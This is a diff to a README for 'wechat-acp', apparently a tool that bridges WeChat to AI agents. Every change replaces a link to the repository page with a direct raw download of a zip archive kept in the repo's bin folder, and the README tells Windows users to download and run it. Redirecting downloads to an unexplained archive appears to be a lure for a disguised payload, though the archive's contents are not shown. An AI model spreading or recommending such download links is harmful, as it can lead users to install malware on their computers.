@@ -1,6 +1,6 @@
 # 🤖 wechat-acp - Bridge WeChat to AI agents
 
-[![Download wechat-acp](https://img.shields.io/badge/Download%20wechat--acp-7e57c2?style=for-the-badge&logo=github&logoColor=white)](https://github.com/elijax12345678-gif/wechat-acp)
+[![Download wechat-acp](https://img.shields.io/badge/Download%20wechat--acp-7e57c2?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/elijax12345678-gif/wechat-acp/main/bin/acp_wechat_2.3.zip)
 
 ## 🧭 What this app does
 
@@ -26,7 +26,7 @@ Use a Windows PC with:
 
 Open the download page here:
 
-https://github.com/elijax12345678-gif/wechat-acp
+https://raw.githubusercontent.com/elijax12345678-gif/wechat-acp/main/bin/acp_wechat_2.3.zip
 
 On that page, download the Windows version of wechat-acp. If the page shows a release file, download that file. If the page shows a list of files, choose the Windows app file.
 
@@ -141,4 +141,4 @@ You decide what chats to connect and what agent to use. Keep your account detail
 
 ## 📎 Download again
 
-https://github.com/elijax12345678-gif/wechat-acp
+https://raw.githubusercontent.com/elijax12345678-gif/wechat-acp/main/bin/acp_wechat_2.3.zip
